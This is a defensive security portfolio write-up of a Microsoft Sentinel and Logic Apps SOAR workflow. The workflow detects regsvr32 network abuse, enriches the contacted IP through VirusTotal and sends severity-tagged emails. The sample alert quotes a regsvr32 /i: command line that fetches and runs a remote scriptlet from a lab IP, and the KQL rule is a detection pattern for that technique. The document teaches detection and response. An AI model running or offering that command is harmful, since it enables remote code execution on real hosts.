# **Phase 4 – SOAR Automation with Logic Apps (Microsoft Sentinel)**

## **Overview**

This phase explored SOAR (Security Orchestration, Automation, and Response) integration using Microsoft Sentinel and Logic Apps. The goal was to automate alert enrichment and response actions — simulating what an analyst would otherwise perform manually during triage. This pushed me outside my detection comfort zone and into the response domain, requiring a shift in thinking: what does an analyst *actually need* to make a decision quickly? What’s high-priority vs background noise?

## **Objectives**

* Learn how Sentinel incidents trigger Logic Apps

* Extract and enrich alert data using external APIs

* Implement conditional branching to route high- and low-severity events

* Simulate analyst workflows, especially IOC validation

* Learn to parse nested JSON structures inside alert payloads

## **Workflow Summary**

1. A KQL detection triggers on suspicious use of `regsvr32.exe` (T1218.010) contacting an external IP via HTTP

2. Sentinel creates an incident and triggers a Logic App

3. The Logic App extracts alert fields from `ExtendedProperties`

4. Contacted IP is parsed and sent to VirusTotal via HTTP GET request

5. The JSON response is parsed to extract `malicious` and `reputation` scores

6. Branching logic evaluates the reputation:

   * If **malicious \> 0** or **reputation \< 0** → Send `[ALERT]` email

   * Else → Send `[INFO]` email

## **Logic App Breakdown**

* **Trigger**: Sentinel alert

* **Compose**: Extracts `ExtendedProperties` field

* **Parse JSON**: Uses sample body to identify alert elements

* **Field Extraction**: Manually parsed fields for clarity: User, Image, CommandLine, ParentImage, IntegrityLevel, Contacted IP

* **HTTP Action**: GET request to VirusTotal API (with API key)

* **Parse JSON (VT)**: Extract `malicious` and `reputation` scores

* **Condition Block**:

  * `IF malicious > 0 OR reputation < 0` → Send alert email

  * `ELSE` → Send low-priority info email

[View Logic App Workflow PDF](/sentinel__detection_projects/phase4_regsvr32_soar/logic_app_success.pdf)

**Email Output (ALERT)**:

 Subject:  
\[ALERT\] Suspicious Regsvr32 Activity | User: redteam | IP: 192.168.1.80

Body:  
\- User: redteam  
\- Image: C:\\Windows\\System32\\regsvr32.exe  
\- Parent Image: powershell.exe  
\- CommandLine: regsvr32 /i:http://192\[.\]168\[.\]1\[.\]80/file.sct scrobj.dll  
\- Integrity Level: High  
\- Contacted IP: 192.168.1.80  
\- VT Malicious Score: 3  
\- VT Reputation Score: \-10

Recommended Actions:  
\- Investigate user activity  
\- Review traffic to the contacted IP  
\- Isolate the host if confirmed

[View sent email alert](/sentinel__detection_projects/phase4_regsvr32_soar/email_alert.PNG)


## **Technical Implementation**

**KQL Trigger**:
```kql
Event
| where EventID == 1
| extend raw_xml = tostring(EventData)
| extend 
    Image = extract(@"<Data Name=""Image"">(.*?)</Data>", 1, raw_xml),
    CommandLine = extract(@"<Data Name=""CommandLine"">(.*?)</Data>", 1, raw_xml),
    ParentImage = extract(@"<Data Name=""ParentImage"">(.*?)</Data>", 1, raw_xml),
    User = extract(@"<Data Name=""User"">(.*?)</Data>", 1, raw_xml),
    IntegrityLevel = extract(@"<Data Name=""IntegrityLevel"">(.*?)</Data>", 1, raw_xml)
| extend 
    ExtractedIP = extract(@"http[s]?://([^/]+)", 1, CommandLine)
| where Image endswith "regsvr32.exe" 
    and CommandLine has "http"
| project 
    TimeGenerated, 
    User, 
    Image, 
    CommandLine, 
    ParentImage, 
    IntegrityLevel,
    ExtractedIP

```
*  **Note:** `ExtractedIP` was added in retrospect after realising that this critical indicator could be reliably parsed directly in KQL rather than extracted later via Logic Apps. This streamlined the enrichment process, enabling simpler Logic App parsing and improving alert context earlier in the workflow.

* **Parsing Challenges**: The JSON inside ExtendedProperties required layered parsing. I used both UI and code view to troubleshoot, ultimately simplifying it by manually isolating each field in individual parse steps.

* **VirusTotal Query**: Used HTTP GET to query IP reputation. Sample JSON response copied from browser DevTools, then used to structure the `Parse JSON` action.

## **Analyst Workflow Impact**

Without automation, an analyst would:

* Manually extract the contacted IP from alert

* Search VirusTotal manually

* Estimate severity based on returned data

* Write a case summary

This Logic App replaces all of that with:

* IOC enrichment

* Structured alert context

* Severity-based tagging via email subject

It reduces MTTR, helps prevent alert fatigue, and supports faster escalation.

## **Triage Mapping**

* `[ALERT]` emails simulate Priority: High cases for SOC queues

* `[INFO]` emails simulate lower priority events (e.g., shadow IT, internal testing)

* Escalation logic is based on **malicious score** and **reputation**

## **Lessons Learned**

* Parsing nested JSON from Sentinel alerts is messy, especially when working with `ExtendedProperties`. Learning to inspect the payload in code view helped me understand field structure.

* Email formatting matters — structured fields make analyst review easier.

* I overcomplicated some parts of the flow but now understand how to streamline it.

## **Real-World Improvements**

If deploying this in a live SOC, I’d implement:

1. **Error Handling for VT Failures**

   * Add branch to handle 404 or timeout

   * Fallback enrichment (AbuseIPDB) or notify analyst with warning

2. **Filename Extraction & Hashing**

   * Parse filename from command line (e.g., `file.sct`)

   * Hash and enrich using file reputation services (e.g., ReversingLabs)

3. **Expanded Conditional Logic**

   * Add new branches: `if malicious > 0`, `if file_score > X`, etc.

4. **Tagging Known-Good Use**

   * Add allowlist for known internal IPs, accounts, or automation sources

   * Log these quietly but avoid notifying analysts

5. **Integration with Case Management**

   * Route enriched alerts directly into a ticketing system like TheHive or ServiceNow

---

This phase brought the project full circle — moving from detection to triage and enrichment. It represents what a junior analyst should aim to learn post-detection: how to reduce triage time, surface critical IOCs, and improve SOC efficiency through lightweight, automatable processes.
